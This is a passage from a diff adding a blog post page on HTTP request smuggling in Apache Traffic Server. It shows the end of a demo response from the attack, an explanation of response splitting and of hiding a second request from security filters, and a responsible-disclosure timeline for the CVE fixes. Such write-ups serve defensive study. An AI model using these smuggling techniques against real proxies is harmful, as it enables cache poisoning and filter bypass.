+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">120</span>
+<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 14:16:28 GMT</span>
+<span class="na">ETag</span><span class="o">:</span> <span class="l">&quot;5bd321bc-78&quot;</span>
+<span class="na">X-Location-echo</span><span class="o">:</span> <span class="l">/index.html?evil=cogip2000</span>
+<span class="na">X-Default-VH</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">public, max-age=300</span>
+<span class="na">Accept-Ranges</span><span class="o">:</span> <span class="l">bytes</span>
+<span class="na">Age</span><span class="o">:</span> <span class="l">0</span>
+
+$<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Nginx default static page<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;h1&gt;</span>Hello World<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>It works!<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>
+
+
+<p>Here the issue is <strong>critical</strong>, especially because <strong>there is not invalid syntax in the attacking query</strong>.</p>
+
+<p>We have an HTTP response splitting, this means two main impacts:</p>
+
+<ul>
+<li>ATS may be used to poison or hurt an actor used in front of it</li>
+<li>the second query is hidden (that's a body, binary garbage for an http actor), so any security filter set in front of ATS
+cannot block the 2nd query. We could use that to hide a second layer of attack
+like an ATS cache poisoning as described in the other attacks. Now that you have a working lab you can try embedding several layers of attacks...</li>
+</ul>
+
+
+<p>That's what the <strong>Drain the request body if there is a cache hit</strong> fix is about.</p>
+
+<p>Just to better understand <em>real world impacts</em>, here the only one receiving response B instead of C is the attacker. HaProxy is not a cache, so the mix C-request/B-response on HaProxy is not a real direct threat. But if there is a cache in front of HaProxy, or if we use several chained ATS proxies...</p>
+
+<h2>Timeline</h2>
+
+<ul>
+<li>2017-12-26: Reports to project maintainers</li>
+<li>2018-01-08: Acknowledgment by project maintainers</li>
+<li>2018-04-16: Version 7.1.3 with most of the fix</li>
+<li>2018-08-04: Versions 7.1.4 and 6.2.2 (officially containing all fixs, and some other CVE fixs)</li>
+<li>2018-08-28: <a href="https://lists.apache.org/thread.html/7df882eb09029a4460768a61f88a30c9c30c9dc88e9bcc6e19ba24d5@%3Cusers.trafficserver.apache.org%3E">CVE announce</a></li>
+<li>2019-10-17: This article</li>
+</ul>
+
+
+<h2>See also</h2>
+
+<ul>
+<li>Video <a href="https://www.youtube.com/watch?v=dVU9i5PsMPY">Defcon 24: HTTP Smuggling</a></li>
+<li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf">Defcon support</a></li>
+<li>Video <a href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI">Defcon demos</a></li>
+</ul>
+
+
+
+          </div>
+         </div>
+        </div>
+        <div class="tag">Tags:&nbsp;<i class="glyphicon glyphicon-tag"></i><a href="/tag/CVE/">CVE</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/HTTP/">HTTP</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/Pound/">Pound</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/Security/">Security</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/Smuggling/">Smuggling</a></div>
+</article>
+<hr/>
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: * * */
+    var disqus_shortname = "regilero";
+    var disqus_identifier = '9dchfg-ebb4-2cdfe-586dcaa665ecec50f0';
+    var disqus_title = "Security: HTTP Smuggling, Apache Traffic Server";
+    var disqus_url = 'http://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+    
+
+      </div>
+      <div class="col-md-4" id="sideBar">
+
+            <div id="sideBarContent"> 
+              
+              <div class="sideBarListBox">
+                <div class="page-header">
+                <h3>Related posts</h3>
+                </div>
+                <div class="list-group" role="navigation">
+                  
+                     <a class="list-group-item" href="/english/security/2018/07/03/security_pound_http_smuggling/">
+                     <h4>Security: HTTP Smuggling, Apsis Pound load balancer</h4>
+                     <p>details of CVE-2016-10711 (published feb 2018).</p>
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/security/2019/04/24/security_jetty_http_smuggling/">
+                     <h4>Security: HTTP Smuggling, Jetty</h4>
+                     <p>details of CVE-2017-7656, CVE-2017-7657 and CVE-2017-7658 (June 2018 - Jetty).</p>
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/security/2015/10/04/http_smuggling_in_2015_part_one/">
+                     <h4>Checking HTTP Smuggling issues in 2015 - Part1</h4>
+                     <p>First part of the 2015 HTTP Smuggling articles. Injecting HTTP in HTTP, the theory.</p>
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/security/2016/12/19/security_dompdf_rce/">
+                     <h4>Web Security, Dompdf security issues details</h4>
+                     <p>details of december 2015's 3 CVE in dompdf, with one RCE.</p>
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/security/2015/03/25/nginx-integer_truncation/">
+                     <h4>Nginx Integer Truncation</h4>
+                     <p>Exploitation of Integer Overflow with the HTTP Content length Header</p>
+                     </a>
+                  
+                </div>
+              </div>
+              
+      
+              <div class="sideBarListBox">
+                <div class="page-header">
+                <h3>Latest posts</h3>
+                </div>
+                <div class="list-group" role="navigation">
+                  
+                     <a class="list-group-item" href="/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/">
+                     Security: HTTP Smuggling, Apache Traffic Server
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/security/2019/04/24/security_jetty_http_smuggling/">
+                     Security: HTTP Smuggling, Jetty
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/security/2018/07/03/security_pound_http_smuggling/">
+                     Security: HTTP Smuggling, Apsis Pound load balancer
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/postgresql/2017/06/26/postgresql_advanced_generate_series/">
+                     PostgreSQL, advanced use of generate_series for data generation
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/security/2016/12/19/security_dompdf_rce/">
+                     Web Security, Dompdf security issues details
+                     </a>
+                  
+                </div>
+              </div>
+            
+              <div class="sideBarListBox">
+                <div class="page-header">
+                <h3>Tags</h3>
+                </div>
+
+                <div class="tagcloud">
+                <a style='font-size: 12px' class='taglink' href='/tag/Dojo/'>Dojo</a>
+<a style='font-size: 31px' class='taglink' href='/tag/HTTP/'>HTTP</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Monitoring/'>Monitoring</a>
+<a style='font-size: 21px' class='taglink' href='/tag/PostgreSQL/'>PostgreSQL</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Plone/'>Plone</a>
+<a style='font-size: 21px' class='taglink' href='/tag/mod_rewrite/'>mod_rewrite</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HTML5/'>HTML5</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Bash/'>Bash</a>
+<a style='font-size: 23px' class='taglink' href='/tag/CVE/'>CVE</a>
+<a style='font-size: 18px' class='taglink' href='/tag/BlockReplace/'>BlockReplace</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Injection/'>Injection</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HAProxy/'>HAProxy</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Cache/'>Cache</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Managed/'>Managed</a>
+<a style='font-size: 12px' class='taglink' href='/tag/js/'>js</a>
+<a style='font-size: 23px' class='taglink' href='/tag/SaltStack/'>SaltStack</a>
+<a style='font-size: 18px' class='taglink' href='/tag/APC/'>APC</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Accumulated/'>Accumulated</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Ajax/'>Ajax</a>
+<a style='font-size: 31px' class='taglink' href='/tag/Apache/'>Apache</a>
+<a style='font-size: 21px' class='taglink' href='/tag/Proxy/'>Proxy</a>
+<a style='font-size: 30px' class='taglink' href='/tag/PHP/'>PHP</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Linux/'>Linux</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Varnish/'>Varnish</a>
+<a style='font-size: 21px' class='taglink' href='/tag/Nginx/'>Nginx</a>
+<a style='font-size: 30px' class='taglink' href='/tag/Drupal/'>Drupal</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Bug/'>Bug</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Mongodb/'>Mongodb</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Jetty/'>Jetty</a>
+<a style='font-size: 32px' class='taglink' href='/tag/Security/'>Security</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Js/'>Js</a>
+<a style='font-size: 18px' class='taglink' href='/tag/RewriteMap/'>RewriteMap</a>
+<a style='font-size: 23px' class='taglink' href='/tag/Smuggling/'>Smuggling</a>
+<a style='font-size: 12px' class='taglink' href='/tag/ZendFramework/'>ZendFramework</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Pound/'>Pound</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Statistics/'>Statistics</a>
+<a style='font-size: 26px' class='taglink' href='/tag/Performance/'>Performance</a>
+<a style='font-size: 18px' class='taglink' href='/tag/jinja/'>jinja</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Web/'>Web</a>
+<a style='font-size: 18px' class='taglink' href='/tag/PHP-fpm/'>PHP-fpm</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HTML/'>HTML</a>
+
+                </div>
+              </div>
+          </div> <!-- end sideBarContent -->
+            
+            <div class="sideBarMore">
+              <div class="page-header">
+              <h3>About</h3>
+              </div>
+                <a href="https://twitter.com/regilero" target="_blank"><img src="/theme/img/twitter_thumb.png" width="48" height="48" alt="Twitter regilero" title="Twitter regilero"></a>
+                <a href="https://github.com/regilero" target="_blank"><img src="/theme/img/github_thumb.png" width="48" height="48" alt="Github regilero" title="Github regilero"></a>
+                <a href="http://www.flickr.com/photos/regilero/" target="_blank"><img src="/theme/img/flickr_thumb.png" width="48" height="48" alt="Flickr photos" title="Flickr photos"></a>
+                <a href="http://stackoverflow.com/users/550618/regilero" target="_blank"><img src="http://stackoverflow.com/users/flair/550618.png" width="208" height="58" alt="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers" title="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers"></a>
+                <a href="https://stackexchange.com/users/264377/regilero"  target="_blank"><img src="http://stackexchange.com/users/flair/264377.png?theme=clean" width="208" height="58" alt="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" title="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" /></a>
+            </div>
+            <div class="sideBarItem">
+              <h3>Some Friends</h3>
+                <ul>
+                  <li><a class="effect" target="_blank" href="http://makina-corpus.com/blog/metier/actu-metier">Blogs Makina Corpus<div class="cover-right"><img src="/theme/img/makinaorg.png" height="30" width="30"><img src="/theme/img/makinaorg_banner.png" height="30" width="117"></div></a></li>
+                  <li><a class="effect" target="_blank" href="http://www.makina-corpus.com">Makina Corpus<div class="cover-right"><img src="/theme/img/makinacom.png" height="30" width="30"><img src="/theme/img/makinacom_banner.png" height="30" width="117"></div></a></li>
+                  <li><a class="effect" target="_blank" href="http://blog.processus.org/">Pounard, processus.org<div class="cover-right"><img src="/theme/img/pounard.png" height="30" width="30"><img src="/theme/img/pounard_banner.png" height="30" width="117"></div></a></li>
+                  <li><a class="effect" target="_blank" href="http://toutpt.github.io/" >Toupt<div class="cover-right"><img src="/theme/img/toupt.png" height="30" width="30"><img src="/theme/img/toupt_banner.png" height="30" width="117"></div></a></li>
+                  <li><a class="effect" target="_blank" href="http://francoisgaudin.com/">François Gaudin<div class="cover-right"><img src="/theme/img/gaudin.png" height="30" width="30"><img src="/theme/img/gaudin_banner.png" height="30" width="117"></div></a></li>
+                  <li><a class="effect" target="_blank" href="http://fle.github.io/">Florent Lebreton<div class="cover-right"><img src="/theme/img/fle.png" height="30" width="30"><img src="/theme/img/fle_banner.png" height="30" width="117"></div></a></li>
+                </ul>
+                <div class="clear"></div>
+            </div>
+         </div> <!-- end sidebar -->
+        
+       </div><!-- end row -->
+       <div class="row">
+         <div class="col-md-12" id="footer">
+           <div class="panel panel-default">
+             <div class=panel-footer">
+          <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/fr/"><img alt="Licence Creative Commons" style="border-width:0" src="http://i.creativecommons.org/l/by-sa/3.0/fr/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">regilero's blog</span> est mis à disposition selon les termes de la <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/fr/">licence Creative Commons Attribution -  Partage dans les Mêmes Conditions 3.0 France</a>.<br />Fondé(e) sur une œuvre à <a xmlns:dct="http://purl.org/dc/terms/" href="http://regilero.github.io" rel="dct:source">http://regilero.github.io</a>.
+              </div>
+            </div>
+         </div>
+       </div><!-- end row -->
+  </div>
+
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<!--    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script> -->
+    <script src="/theme/js/toc.min.js" ></script>
+    <script src="/theme/js/effects.js" ></script>
+   <script src="/theme/js/jquery.parallax.min.js"></script>
+    <script src="/theme/bootstrap/js/bootstrap.min.js"></script>
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-40859893-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+    </body>
+</html>
